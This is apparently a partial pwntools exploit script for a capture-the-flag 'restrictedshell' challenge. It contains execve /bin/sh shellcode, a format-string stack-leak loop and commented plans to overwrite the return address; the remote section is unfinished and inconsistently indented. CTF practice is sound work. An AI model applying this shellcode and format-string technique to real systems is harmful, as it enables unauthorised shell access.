from pwn import *

local=True


#gdb.attach(sh)

# execve for scanf (bypass chars that terminate read before expected)
shellcode ="\x31\xc0\x50\x68"
shellcode +="\x2f\x2f\x73\x68"
shellcode +="\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50"
shellcode +="\x53\x89\xe1\x31"
shellcode +="\xc0\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\xcd\x80"

NOP = "\x90"

# eip = p32(int(leaked_addr, 16)) # p64 for 64 bits
# payload = shellcode.rjust(NOP, 10) + eip
context.log_level = 'critical'

if local:
	for i in range(300):
		try:
			sh = process('./restrictedshell', aslr=False)
			sh.recv() # rsh$
			sh.sendline("prompt")
			sh.recv() # Enter new prompt string: 

			payload = "%{0}$8p | %{0}$8x | %{0}$s".format(i)
			sh.sendline(payload)

			print i, sh.clean()
		except EOFError:
			print i, "EOF or nil"

		# check leaked_stack.txt (123 0x8048902 |  8048902 | '\xc6' )-> is the return address to main

		# from this test we see that ouw string starts at index 5 (5*$esp)
		#Enter new prompt string: %x %x %x %x %x %x %x %x 
		#64 f7ee45a0 0 f7f20e39 25207825 78252078 20782520 25207825

		# since the new prompt str buffer is 100b, we can:
		# 1. padd the string to the left so we avoid overriding our exploit later
		# 2. use format string exploit (XXX %123$p) to override the return address to 
		# 	an area on the buffer/stack we control
		# 3. overflow the buffer so it considers our final bytes as the next command
		# 	which will 'exit' and trigger the jump to our shellcode
else:
    sh = remote("ctf.hackucf.org", 7007)
	sh.recv() # rsh$
	sh.sendline("prompt")
	sh.recv() # Enter new prompt string: 
	format_str = "%5$p %123$n" # we write the address (incomplete)

	# when we get a shell
	# sh.interactive()